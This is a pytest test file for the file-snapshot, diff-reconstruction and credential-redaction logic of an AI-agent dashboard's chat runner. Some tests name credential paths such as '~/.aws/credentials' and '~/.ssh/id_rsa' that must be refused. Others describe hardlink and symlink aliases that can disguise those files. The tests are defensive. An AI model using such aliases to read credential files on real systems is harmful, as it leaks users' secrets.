"""Tests for file-change snapshot logic in chat_runner.

Covers:
  * ``_truncate_snapshot`` — caps content at 200KB.
  * ``_safe_read_snapshot`` — reads through the descriptor gate; rejects sensitive
    paths and hardlink/symlink aliases of them.
  * ``_snapshot_write_target`` — captures before-content for write tools only.
  * ``_flush_file_changes`` — dedups, scrubs credentials, attaches to last assistant message
    or creates a synthetic one when the turn aborts before any assistant text.

These tests target the file-chips feature added. They drive
new-line coverage on chat_runner.py from ~0% to a substantial fraction without
touching the live ACP runtime — every test stays in pure-Python land.
"""

from __future__ import annotations

import os
import shutil
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
from tmpdir_helpers import SHORT_TMP_PREFIX, short_tmp_base

from conftest import requires_symlinks
from kiro_crew.dashboard.chat_runner import (
    _MAX_SNAPSHOT,
    _bind_pending_str_replace,
    _flush_file_changes,
    _safe_read_snapshot,
    _settle_pending_str_replace_outcome,
    _snapshot_write_target,
    _tcid_identity_key,
    _truncate_snapshot,
)
from kiro_crew.dashboard.state import _ChatSlot


@pytest.fixture
def short_tmp_dir():
    """A short-path temp dir under ``/tmp``, removed on teardown.

    These tests assert on a file's PATH as it appears in message metadata, and a
    macOS ``tmp_path`` carries high-entropy directory ids that trip
    ``redact_credentials()`` on that field -- so the path has to come from ``/tmp``
    rather than from ``tmp_path``. ``mkdtemp`` registers no finalizer, though, so
    the nine inline calls this replaces each leaked a directory that survived the
    run; ``/tmp`` is not swept per-run the way pytest's own basetemp is.
    """
    base = Path(tempfile.mkdtemp(prefix=SHORT_TMP_PREFIX + "snap-", dir=short_tmp_base()))
    try:
        yield base
    finally:
        shutil.rmtree(base, ignore_errors=True)


# ── _truncate_snapshot ──────────────────────────────────────────────────────


class TestTruncateSnapshot:
    def test_below_cap_passes_through(self):
        assert _truncate_snapshot("hello world").content == "hello world"

    def test_empty_string_passes_through(self):
        assert _truncate_snapshot("").content == ""

    def test_exactly_at_cap_not_truncated(self):
        content = "a" * _MAX_SNAPSHOT
        assert _truncate_snapshot(content).content == content

    def test_above_cap_truncated_with_marker(self):
        content = "a" * (_MAX_SNAPSHOT + 100)
        out = _truncate_snapshot(content)
        # Original prefix preserved, marker appended.
        assert out.content.startswith("a" * _MAX_SNAPSHOT)
        assert "(truncated at" in out.content
        assert str(_MAX_SNAPSHOT) in out.content

    @pytest.mark.parametrize(
        ("length", "truncated"),
        [(_MAX_SNAPSHOT - 1, False), (_MAX_SNAPSHOT, False), (_MAX_SNAPSHOT + 1, True)],
    )
    def test_reports_truncation_at_boundary(self, length: int, truncated: bool):
        snapshot = _truncate_snapshot("é" * length)
        assert snapshot.truncated is truncated

    def test_truncation_idempotent_on_already_short_content(self):
        out = _truncate_snapshot("short")
        assert _truncate_snapshot(out.content).content == "short"


# ── _safe_read_snapshot ─────────────────────────────────────────────────────


class TestSafeReadSnapshot:
    def test_reads_normal_file(self, tmp_path: Path):
        f = tmp_path / "file.txt"
        f.write_text("hello\nworld\n")
        snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "hello\nworld\n"

    def test_reads_utf8_regardless_of_locale(self, tmp_path: Path, monkeypatch):
        # Git and agent-authored files are UTF-8 whatever the host's preferred
        # code page says; the read must not consult the locale at all.
        f = tmp_path / "unicode.txt"
        f.write_text("こんにちは", encoding="utf-8")
        import locale

        monkeypatch.setattr(locale, "getpreferredencoding", lambda *_a, **_k: "cp1252")
        snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "こんにちは"

    def test_normalizes_newlines_like_the_text_mode_read_it_replaces(self, tmp_path: Path):
        # The strReplace "before" is a text-mode read; a CRLF "after" that kept
        # its \r would diff every unchanged line as modified.
        f = tmp_path / "crlf.txt"
        f.write_bytes(b"one\r\ntwo\rthree\r\n")
        snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "one\ntwo\nthree\n"

    def test_reads_through_the_descriptor_gate_not_by_name(self, tmp_path: Path):
        # The bytes served must come from the descriptor the gate validated, so
        # a by-name re-open after validation is exactly what must NOT happen.
        f = tmp_path / "file.txt"
        f.write_text("hello\n")
        with patch.object(Path, "read_text", side_effect=AssertionError("re-opened by name")):
            snapshot = _safe_read_snapshot(str(f))
        assert snapshot is not None
        assert snapshot.content == "hello\n"

    def test_returns_none_for_missing_file(self, tmp_path: Path):
        assert _safe_read_snapshot(str(tmp_path / "ghost")) is None

    def test_returns_none_for_directory(self, tmp_path: Path):
        # validate_file_path resolves to the directory, .is_file() == False.
        assert _safe_read_snapshot(str(tmp_path)) is None

    def test_returns_none_for_empty_path(self):
        # validate_file_path returns None for empty string.
        assert _safe_read_snapshot("") is None

    def test_returns_none_for_sensitive_path(self):
        # ~/.aws is on the sensitive-path list — should never be read for snapshot.
        assert _safe_read_snapshot("~/.aws/credentials") is None
        assert _safe_read_snapshot("~/.ssh/id_rsa") is None

    def test_withholds_a_hardlink_alias_of_a_protected_file(self, tmp_path: Path, monkeypatch):
        """A hardlink alias shares its target's inode but carries its own innocent
        name: ``realpath`` yields the alias, ``is_symlink()`` is False, and every
        name-based check passes while the bytes belong to ``~/.aws/credentials``.
        ``st_nlink`` is the only signal, and only an open descriptor exposes it —
        so the read has to go through the descriptor gate, not re-open by name.
        """
        # Path.home() reads USERPROFILE on Windows and never HOME; pin both.
        monkeypatch.setenv("HOME", str(tmp_path))
        monkeypatch.setenv("USERPROFILE", str(tmp_path))
        from kiro_crew.security import is_sensitive_path

        secret = tmp_path / ".aws" / "credentials"
        secret.parent.mkdir()
        secret.write_text("aws_secret_access_key = SHOULD-NOT-APPEAR\n", encoding="utf-8")
        assert is_sensitive_path(str(secret)), "precondition: the target is protected"
        assert _safe_read_snapshot(str(secret)) is None, "precondition: the name is refused"

        alias = tmp_path / "project" / "notes.md"
        alias.parent.mkdir()
        try:
            os.link(secret, alias)
        except (OSError, NotImplementedError) as exc:  # pragma: no cover - host capability
            pytest.skip(f"filesystem does not support hardlinks: {exc}")
        if alias.stat().st_nlink < 2:  # pragma: no cover - host capability
            pytest.skip("filesystem did not create a second link")

        assert _safe_read_snapshot(str(alias)) is None

    @requires_symlinks
    def test_withholds_a_symlink_to_a_protected_file(self, tmp_path: Path, monkeypatch):
        # The link is refused at the open (``O_NOFOLLOW`` / no-reparse), before
        # any name-based resolution could launder it into an innocent path.
        # Path.home() reads USERPROFILE on Windows and never HOME; pin both.
        monkeypatch.setenv("HOME", str(tmp_path))
        monkeypatch.setenv("USERPROFILE", str(tmp_path))
        secret = tmp_path / ".aws" / "credentials"
        secret.parent.mkdir()
        secret.write_text("SHOULD-NOT-APPEAR\n", encoding="utf-8")
        link = tmp_path / "project" / "notes.md"
        link.parent.mkdir()
        link.symlink_to(secret)
        assert _safe_read_snapshot(str(link)) is None

    def test_truncates_large_file(self, tmp_path: Path):
        big = tmp_path / "big.txt"
        big.write_text("x" * (_MAX_SNAPSHOT + 50))
        out = _safe_read_snapshot(str(big))
        assert out is not None
        assert "(truncated at" in out.content
        assert out.truncated is True

    def test_truncates_a_large_multibyte_file_with_the_marker(self, tmp_path: Path):
        # Four-byte code points: the byte cap must still leave MORE than the
        # character cap, or a file just over the cap would lose its marker.
        big = tmp_path / "big.txt"
        big.write_text("\U0001f600" * (_MAX_SNAPSHOT + 1), encoding="utf-8")
        out = _safe_read_snapshot(str(big))
        assert out is not None
        assert out.content.startswith("\U0001f600" * _MAX_SNAPSHOT)
        assert "(truncated at" in out.content
        assert out.truncated is True

    def test_replaces_undecodable_bytes(self, tmp_path: Path):
        # errors="replace" is used so binary garbage doesn't crash the read.
        f = tmp_path / "binary.bin"
        f.write_bytes(b"hello\xff\xfeworld")
        out = _safe_read_snapshot(str(f))
        assert out is not None
        assert "hello" in out.content and "world" in out.content


# ── _snapshot_write_target ─────────────────────────────────────────────────


class TestSnapshotWriteTarget:
    def test_returns_none_for_non_dict_params(self):
        assert _snapshot_write_target(None) is None
        assert _snapshot_write_target("str") is None  # type: ignore[arg-type]
        assert _snapshot_write_target([]) is None  # type: ignore[arg-type]

    def test_returns_none_for_non_write_command(self, tmp_path: Path):
        f = tmp_path / "x.txt"
        f.write_text("body")
        assert _snapshot_write_target({"command": "Line", "path": str(f)}) is None
        assert _snapshot_write_target({"command": "", "path": str(f)}) is None

    def test_returns_none_for_empty_path(self):
        assert _snapshot_write_target({"command": "create", "path": ""}) is None

    def test_returns_none_for_sensitive_path(self):
        # validate_file_path rejects ~/.aws/credentials → no snapshot taken.
        assert (
            _snapshot_write_target({"command": "strReplace", "path": "~/.aws/credentials"}) is None
        )

    def test_create_on_new_file_returns_empty_content(self, tmp_path: Path):
        # File doesn't exist yet — chip should still surface with empty before.
        target = tmp_path / "new.txt"
        out = _snapshot_write_target({"command": "create", "path": str(target)})
        assert out == {"path": str(target), "content": "", "truncated": False}

    def test_str_replace_on_existing_file_captures_content(self, tmp_path: Path):
        f = tmp_path / "code.py"
        f.write_text("def hello():\n    pass\n")
        out = _snapshot_write_target({"command": "strReplace", "path": str(f)})
        assert out is not None
        assert out["path"] == str(f)
        assert out["content"] == "def hello():\n    pass\n"

    def test_insert_command_recognized_as_write(self, tmp_path: Path):
        f = tmp_path / "list.txt"
        f.write_text("a\nb\n")
        out = _snapshot_write_target({"command": "insert", "path": str(f)})
        assert out is not None
        assert out["content"] == "a\nb\n"


# ── _flush_file_changes ────────────────────────────────────────────────────


def _make_slot_with_assistant_message() -> _ChatSlot:
    """Build a _ChatSlot with one assistant message ready to receive file_changes."""
    slot = _ChatSlot("test-flush")
    slot.append("assistant", "done.", "msg msg-a", broadcast=False)
    return slot


class TestFlushFileChanges:
    def test_no_changes_is_noop(self):
        slot = _make_slot_with_assistant_message()
        _flush_file_changes(slot)
        # No meta added — message stays clean.
        assert "meta" not in slot.messages[-1] or "file_changes" not in slot.messages[-1].get(
            "meta", {}
        )

    def test_magicmock_attribute_does_not_fabricate_message(self):
        # A MagicMock-backed slot leaves _file_changes truthy but not a list.
        # Without the isinstance guard, _flush would synthesize a "stopped"
        # message every test invocation. This test pins that down.
        slot = MagicMock()
        slot.messages = []
        slot._file_changes = MagicMock()  # truthy but not a list
        _flush_file_changes(slot)
        # No synthetic message created.
        assert slot.messages == []

    def test_attaches_to_last_assistant_message(self, short_tmp_dir: Path):
        d = short_tmp_dir
        f = d / "x.py"
        f.write_text("after\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "before\n"}]
        _flush_file_changes(slot)
        meta = slot.messages[-1]["meta"]
        assert "file_changes" in meta
        assert len(meta["file_changes"]) == 1
        assert meta["file_changes"][0]["path"] == str(f)
        assert meta["file_changes"][0]["before"] == "before\n"
        assert meta["file_changes"][0]["after"] == "after\n"
        # Slot's accumulator is reset for the next turn.
        assert slot._file_changes == []

    def test_reads_each_changed_path_from_disk_once(self, short_tmp_dir: Path, monkeypatch):
        """The flush runs synchronously on the event loop, so every after-read is
        latency the whole gateway pays; one read per path is the budget, however
        many snapshots that path accumulated."""
        import kiro_crew.dashboard.chat_runner as cr

        f, g = short_tmp_dir / "x.py", short_tmp_dir / "y.py"
        f.write_text("after\n")
        g.write_text("after\n")
        reads: list[str] = []
        real_read = cr._safe_read_snapshot

        def counting_read(path: str):
            reads.append(path)
            return real_read(path)

        monkeypatch.setattr(cr, "_safe_read_snapshot", counting_read)
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(f), "content": "before\n"},
            {"path": str(f), "content": "mid\n"},
            {"path": str(g), "content": "before\n"},
        ]
        _flush_file_changes(slot)
        assert sorted(reads) == sorted([str(f), str(g)])

    @pytest.mark.parametrize(
        ("before_length", "after_length"),
        [(_MAX_SNAPSHOT + 1, 1), (1, _MAX_SNAPSHOT + 1), (_MAX_SNAPSHOT + 1, _MAX_SNAPSHOT + 2)],
    )
    def test_truncated_payload_reports_the_snapshot_limit(
        self, tmp_path: Path, before_length: int, after_length: int
    ) -> None:
        target = tmp_path / "large.txt"
        target.write_text("a" * after_length)
        captured = _snapshot_write_target(
            {"command": "create", "path": str(target)},
            diff_old_text="é" * before_length,
        )
        assert captured is not None
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [captured]
        _flush_file_changes(slot)
        change = slot.messages[-1]["meta"]["file_changes"][0]
        assert change["truncated"] is True
        assert change["snapshot_limit_chars"] == _MAX_SNAPSHOT

    def test_untruncated_payload_keeps_the_legacy_shape(self, tmp_path: Path) -> None:
        target = tmp_path / "small.txt"
        target.write_text("after")
        captured = _snapshot_write_target(
            {"command": "create", "path": str(target)}, diff_old_text="before"
        )
        assert captured is not None
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [captured]
        _flush_file_changes(slot)
        assert slot.messages[-1]["meta"]["file_changes"][0] == {
            "path": str(target),
            "before": "before",
            "after": "after",
        }

    def test_dedup_keeps_first_before(self, short_tmp_dir: Path):
        d = short_tmp_dir
        f = d / "loop.py"
        f.write_text("v3\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(f), "content": "v1\n"},
            {"path": str(f), "content": "v2\n"},
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 1
        # First "before" wins (truest pre-turn snapshot).
        assert changes[0]["before"] == "v1\n"
        # After-content is read from disk once.
        assert changes[0]["after"] == "v3\n"

    def test_dedup_across_multiple_files(self, short_tmp_dir: Path):
        d = short_tmp_dir
        a = d / "a.py"
        b = d / "b.py"
        a.write_text("a-after")
        b.write_text("b-after")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(a), "content": "a-before"},
            {"path": str(b), "content": "b-before"},
            {"path": str(a), "content": "a-mid"},  # dedup'd
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert len(changes) == 2
        paths = {c["path"] for c in changes}
        assert paths == {str(a), str(b)}

    def test_after_empty_when_file_deleted_during_turn(self, tmp_path: Path):
        slot = _make_slot_with_assistant_message()
        # Simulate: write tool ran, captured before, then the file was removed.
        ghost = tmp_path / "ghost.txt"
        slot._file_changes = [{"path": str(ghost), "content": "had-content\n"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert changes[0]["after"] == ""
        assert changes[0]["before"] == "had-content\n"

    def test_redacts_credentials_in_after_content(self, tmp_path: Path):
        f = tmp_path / "config.ini"
        f.write_text("aws_access_key_id=AKIAIOSFODNN7EXAMPLE\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": "(empty)"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        # AKIA key is scrubbed before reaching the UI.
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["after"]

    def test_redacts_credentials_in_before_content(self, tmp_path: Path):
        f = tmp_path / "post-edit.ini"
        f.write_text("clean\n")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [
            {"path": str(f), "content": "aws_secret_access_key=AKIAIOSFODNN7EXAMPLE\n"}
        ]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]

    def test_an_unchanged_credential_line_is_not_turned_into_a_phantom_diff(
        self, tmp_path: Path
    ) -> None:
        """Redaction must not decide changed-ness.

        Both sides go through the SAME pass, so a line the redactor rewrites is
        rewritten identically on both — an untouched line stays equal and the UI
        renders no diff. Redacting one side only (or twice on one side) would
        render an unchanged docs line as
        ``- Bearer <value>`` / ``+ [REDACTED: credential]``: a phantom
        modification, with the real text hidden on the very surface meant to
        review it.
        """
        f = tmp_path / "AGENTS.md"
        unchanged = '  "headers": { "Authorization": "Bearer lp_dummy_placeholder_value" }\n'
        f.write_text(unchanged, encoding="utf-8")
        slot = _make_slot_with_assistant_message()
        # Same bytes on both sides: the turn touched the file without changing
        # this line (the reported case is a docs/config example).
        slot._file_changes = [{"path": str(f), "content": unchanged}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert (
            changes[0]["before"] == changes[0]["after"]
        ), "identical text redacted asymmetrically -> the UI shows a diff on an unchanged line"
        # The guard is only meaningful because the redactor DID fire here.
        assert "lp_dummy_placeholder_value" not in changes[0]["after"]

    def test_a_real_change_beside_a_credential_line_still_redacts_both_sides(
        self, tmp_path: Path
    ) -> None:
        """The symmetry guard must not be satisfiable by skipping redaction."""
        cred = '  "Authorization": "Bearer lp_dummy_placeholder_value"\n'
        f = tmp_path / "conf.json"
        f.write_text(cred + "changed-line\n", encoding="utf-8")
        slot = _make_slot_with_assistant_message()
        slot._file_changes = [{"path": str(f), "content": cred + "original-line\n"}]
        _flush_file_changes(slot)
        changes = slot.messages[-1]["meta"]["file_changes"]
        assert "lp_dummy_placeholder_value" not in changes[0]["before"]
        assert "lp_dummy_placeholder_value" not in changes[0]["after"]
        # The genuine change survives redaction on both sides.
        assert "original-line" in changes[0]["before"]
        assert "changed-line" in changes[0]["after"]

    def test_synthetic_message_created_when_no_assistant_text(self, short_tmp_dir: Path):
        """User stopped before any assistant chunk: still surface modified files."""
        d = short_tmp_dir
        f = d / "edit.py"
        f.write_text("after\n")
        slot = _ChatSlot("aborted-turn")
        # No assistant message present — only a user message.
        slot.append("user", "hi", "msg msg-u", broadcast=False)
        slot._file_changes = [{"path": str(f), "content": "before\n"}]
        _flush_file_changes(slot)
        # New synthetic message appended at the end.
        last = slot.messages[-1]
        assert last["role"] == "assistant"
        assert "stopped" in last["content"].lower()
        assert last["meta"]["file_changes"][0]["path"] == str(f)


# ── Regression tests: real event ordering & content-block paths ────────────


class TestContentBlockBeforeText:
    """Regression tests that simulate the REAL event-processing ordering.

    In production, kiro-cli auto-approves the write and executes it
    immediately via a one-way notification — by the time the dashboard
    processes the tool_call event, the file on disk already has the NEW
    content. Without the race fix, _snapshot_write_target would read the
    disk and record before == after.

    These tests write the AFTER content to disk FIRST (simulating the race),
    then call _snapshot_write_target with the authoritative diff_old_text
    from the ACP content block, and assert that `before` reflects the
    content-block value (not the racy disk read).
    """

    def test_edit_uses_diff_old_text_despite_disk_having_new_content(self, tmp_path: Path):
        """Simulate: strReplace already executed on disk, event arrives with
        diff_old_text carrying the genuine pre-edit content."""
        f = tmp_path / "app.py"
        # Disk already has the AFTER content (write landed before event processing)
        f.write_text("def hello():\n    return 'new'\n")

        # The ACP content block tells us what was there BEFORE the write
        old_content = "def hello():\n    return 'old'\n"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=old_content,
            diff_path=str(f),
        )
        assert result is not None
        # CRITICAL: before must come from the content block, NOT the disk
        assert result["content"] == old_content
        assert result["path"] == str(f)

    def test_create_with_empty_diff_old_text_yields_empty_before(self, tmp_path: Path):
        """Simulate: create tool wrote a new file, event arrives with
        diff_old_text="" indicating file did not exist before."""
        f = tmp_path / "new_module.py"
        # Disk has the newly created content
        f.write_text("# brand new file\nclass Foo: pass\n")

        result = _snapshot_write_target(
            {"command": "create", "path": str(f)},
            diff_old_text="",  # empty string = created (no prior content)
            diff_path=str(f),
        )
        assert result is not None
        # Before must be empty for a create, regardless of what's on disk
        assert result["content"] == ""
        assert result["path"] == str(f)

    def test_create_with_none_diff_old_text_falls_back_to_disk(self, tmp_path: Path):
        """When diff_old_text is None (no content block present — e.g. the
        blocking permission-request path), fallback to disk read is correct
        because the write hasn't executed yet."""
        f = tmp_path / "existing.py"
        f.write_text("original content\n")

        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f)},
            diff_old_text=None,  # no content block → fallback
            diff_path="",
        )
        assert result is not None
        # Falls back to disk read (correct on the blocking path)
        assert result["content"] == "original content\n"

    def test_diff_path_used_when_params_path_empty(self, tmp_path: Path):
        """diff_path from the content block is used as fallback when
        raw_params has no 'path' key."""
        f = tmp_path / "target.py"
        f.write_text("after edit\n")

        result = _snapshot_write_target(
            {"command": "create", "path": ""},
            diff_old_text="before edit\n",
            diff_path=str(f),
        )
        assert result is not None
        assert result["path"] == str(f)
        assert result["content"] == "before edit\n"


class TestStrReplaceFullBeforeReconstruction:
    """The strReplace fragment-before bug (chips counting the whole file as
    additions).

    kiro-cli's diff content block ``oldText`` for strReplace is only the
    replaced FRAGMENT. The #920 race fix preferred it as the before-snapshot,
    so the chip diffed a fragment against the full-file after and rendered
    every line as an addition (observed live: a 1-line edit in a 12-line file
    showed +13 −1). The fix reconstructs the full before from the post-write
    disk content by reverse-applying the oldStr→newStr substitution.
    """

    BEFORE = "line 1\nline 2 OLD\nline 3\nline 4\n"
    AFTER = "line 1\nline 2 NEW\nline 3\nline 4\n"

    def test_post_write_reverse_substitution(self, tmp_path: Path):
        """Auto-approved path: disk already has AFTER; reconstruct BEFORE."""
        f = tmp_path / "app.py"
        f.write_text(self.AFTER)
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "line 2 OLD",
                "newStr": "line 2 NEW",
            },
            diff_old_text="line 2 OLD",  # fragment, NOT the full file
            diff_path=str(f),
        )
        assert result is not None
        # Full-file before — not the one-line fragment.
        assert result["content"] == self.BEFORE

    def test_pre_write_disk_is_before(self, tmp_path: Path):
        """Blocking permission path: disk still has BEFORE; use it as-is."""
        f = tmp_path / "app.py"
        f.write_text(self.BEFORE)
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "line 2 OLD",
                "newStr": "line 2 NEW",
            },
            diff_old_text="line 2 OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == self.BEFORE

    def test_replace_all_declines_reconstruction(self, tmp_path: Path):
        """Server review finding: replaceAll doesn't enforce oldStr
        uniqueness, so reversing every newStr occurrence over-reverts any
        that pre-existed (NEW\\nOLD\\nOLD edited with replaceAll fabricated
        +3/−3 instead of +2/−2). Reconstruction declines; fragment chain
        applies."""
        f = tmp_path / "multi.txt"
        f.write_text("NEW\nmiddle\nNEW\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "OLD",
                "newStr": "NEW",
                "replaceAll": True,
            },
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"

    def test_old_str_substring_of_new_str_declines(self, tmp_path: Path):
        """Append-style edit, post-write: oldStr ⊂ newStr means the disk
        content is ALSO a valid pre-write state (oldStr occurs exactly once
        in it) — genuinely undecidable, so reconstruction declines rather
        than guessing post-write as the earlier branch order did."""
        f = tmp_path / "append.txt"
        f.write_text("head\nvalue = 1  # tuned\ntail\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "value = 1",
                "newStr": "value = 1  # tuned",
            },
            diff_old_text="value = 1",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "value = 1"

    def test_empty_new_str_deletion_falls_back_to_fragment(self, tmp_path: Path):
        """Deletion (newStr == ''): the removed text's position in the
        after-state is unrecoverable, so reconstruction declines and the
        pre-existing diff_old_text chain applies."""
        f = tmp_path / "del.txt"
        f.write_text("line 1\nline 3\n")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "line 2\n", "newStr": ""},
            diff_old_text="line 2\n",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "line 2\n"

    def test_ambiguous_new_str_declines_reconstruction(self, tmp_path: Path):
        """Full-scope review finding: post-write content with MULTIPLE newStr
        occurrences (newStr pre-existed elsewhere) makes the edit site
        ambiguous — reversing an arbitrary occurrence attributed the edit to
        the wrong line. Reconstruction declines; fragment chain applies."""
        f = tmp_path / "ambig.txt"
        f.write_text("NEW\nNEW\n")  # true before was "NEW\nOLD\n" — unknowable
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"

    def test_post_write_masquerading_as_pre_write_declines(self, tmp_path: Path):
        """Server review finding: strReplace("ab"→"a") on "aabb" yields "aab",
        which contains exactly one "ab" and so looks pre-write-plausible —
        but it IS the post-write state. Classifying it pre-write recorded
        the after as the before and erased the edit from the chip. With
        newStr present and non-unique, post-write cannot be excluded →
        decline."""
        f = tmp_path / "masquerade.txt"
        f.write_text("aab")  # after of strReplace("ab"→"a") on "aabb"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "ab", "newStr": "a"},
            diff_old_text="ab",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain — NOT "aab".
        assert result["content"] == "ab"

    def test_seam_reformation_declines(self, tmp_path: Path):
        """Server review finding: oldStr can re-form across the replacement
        seam (oldStr='ab', newStr='a', before='abb' → after='ab'), making
        the disk content valid as BOTH states. Dual-hypothesis
        classification declines instead of misclassifying as pre-write."""
        f = tmp_path / "seam.txt"
        f.write_text("ab")  # after-state of the seam edit; also a valid before
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "ab", "newStr": "a"},
            diff_old_text="ab",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "ab"

    def test_special_file_declines(self):
        """Server review finding: /dev/zero stats as 0 bytes but reads
        unboundedly — the S_ISREG gate declines non-regular files before
        any read."""
        result = _snapshot_write_target(
            {"command": "strReplace", "path": "/dev/zero", "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path="/dev/zero",
        )
        assert result is not None
        assert result["content"] == "OLD"

    def test_post_read_size_recheck_declines(self, tmp_path: Path, monkeypatch):
        """The stat() gate races with an external writer growing the file;
        the post-read length re-check keeps the substring scans bounded."""
        import kiro_crew.dashboard.chat_runner as cr

        f = tmp_path / "grown.txt"
        f.write_text("NEW\n")  # passes the stat gate
        monkeypatch.setattr(
            cr, "safe_read_file", lambda _p: "x" * (cr._MAX_RECONSTRUCT_BYTES + 1) + "NEW"
        )
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "OLD"

    def test_missing_file_falls_back_to_fragment(self, tmp_path: Path):
        """Unreadable/missing file: reconstruction declines, diff_old_text
        chain applies (never raises)."""
        ghost = tmp_path / "ghost.txt"
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(ghost), "oldStr": "a", "newStr": "b"},
            diff_old_text="a",
            diff_path=str(ghost),
        )
        assert result is not None
        assert result["content"] == "a"

    def test_reconstructed_before_is_truncated(self, tmp_path: Path):
        """Truncation applies AFTER reconstruction so the needle can't be cut
        mid-file, but the meta-size cap still holds."""
        f = tmp_path / "huge.txt"
        f.write_text("x" * (_MAX_SNAPSHOT + 500) + "NEW")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        assert "(truncated at" in result["content"]
        assert len(result["content"]) < _MAX_SNAPSHOT + 500

    def test_pre_write_with_coincidental_new_str_is_before(self, tmp_path: Path):
        """Server review finding: pre-write file containing BOTH needles
        (newStr coincidentally pre-exists) must classify as before —
        reversing the unrelated newStr occurrence fabricated a changed line.
        oldStr present with oldStr ⊄ newStr PROVES pre-write (strReplace
        consumes every oldStr occurrence)."""
        f = tmp_path / "both.txt"
        f.write_text("NEW\nOLD\n")
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Disk content returned unchanged — NOT "OLD\nOLD\n".
        assert result["content"] == "NEW\nOLD\n"

    def test_pre_write_append_edit_uses_disk_as_before(self, tmp_path: Path):
        """oldStr ⊂ newStr shape, write not yet landed: third branch returns
        the disk content as the before."""
        f = tmp_path / "append-pre.txt"
        f.write_text("head\nvalue = 1\ntail\n")
        result = _snapshot_write_target(
            {
                "command": "strReplace",
                "path": str(f),
                "oldStr": "value = 1",
                "newStr": "value = 1  # tuned",
            },
            diff_old_text="value = 1",
            diff_path=str(f),
        )
        assert result is not None
        assert result["content"] == "head\nvalue = 1\ntail\n"

    def test_oversized_file_declines_reconstruction(self, tmp_path: Path, monkeypatch):
        """Server review finding: the synchronous reconstruction read runs on
        the event loop — files past _MAX_RECONSTRUCT_BYTES decline and fall
        through to the fragment chain instead of stalling the loop."""
        import kiro_crew.dashboard.chat_runner as cr

        f = tmp_path / "big.txt"
        f.write_text("payload NEW payload\n")
        monkeypatch.setattr(cr, "_MAX_RECONSTRUCT_BYTES", 4)
        result = _snapshot_write_target(
            {"command": "strReplace", "path": str(f), "oldStr": "OLD", "newStr": "NEW"},
            diff_old_text="OLD",
            diff_path=str(f),
        )
        assert result is not None
        # Fell through to the fragment (diff_old_text) chain.
        assert result["content"] == "OLD"


class TestPendingStrReplaceResolution:
    """An undecidable strReplace snapshot is settled at flush time.

    ``newStr ⊂ oldStr`` (drop a line next to a kept one) and ``oldStr ⊂
    newStr`` (add a line next to a kept one) leave the disk file valid as
    BOTH states at snapshot time, whichever side of the write the snapshot
    lands on. A fragment-only before would render the chip as ``-1 +N``. The
    after-content read at turn end is unambiguous once the tool has reported
    a COMPLETED write, so the snapshot carries the disk content along and the
    flush picks the state.
    """

    PARAMS = {
        "command": "strReplace",
        "oldStr": "export A=0\nexport B=1\n",
        "newStr": "export B=1\n",
    }
    BEFORE = "line 1\nexport A=0\nexport B=1\n"
    AFTER = "line 1\nexport B=1\n"
